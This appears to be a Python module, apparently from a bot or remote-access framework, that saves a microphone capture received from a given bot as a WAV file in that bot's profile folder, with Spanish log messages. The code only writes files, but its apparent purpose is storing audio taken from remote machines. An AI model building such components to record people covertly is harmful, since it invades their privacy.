import wave
from pyaudio import *
from utils.UI import debug
from secrets import token_urlsafe

from conf import global_conf

profile = '{}/{}'.format(global_conf.databases['database'], global_conf.databases['profiles'])

def main(result, log, bot_id):

    if (isinstance(result, tuple)):

        if (len(result) == 4):

            filename = '{}/{}/{}.record.wav'.format(profile, bot_id, token_urlsafe(32))

            audio = PyAudio()

            record = wave.open(filename, 'wb')
            record.setnchannels(result[1])
            record.setsampwidth(audio.get_sample_size(result[0]))
            record.setframerate(result[2])
            record.writeframes(result[3])
            record.close()

            log.logger('Grabación del micrófono hecha: "{}"'.format(filename), debug.PER)

        else:

            log.logger('La longitud del resultado de la captura del micrófono no es correcta', debug.WAR)

    else:

        log.logger('El tipo de dato del resultado de la captura del micrófono no es correcto', debug.WAR)
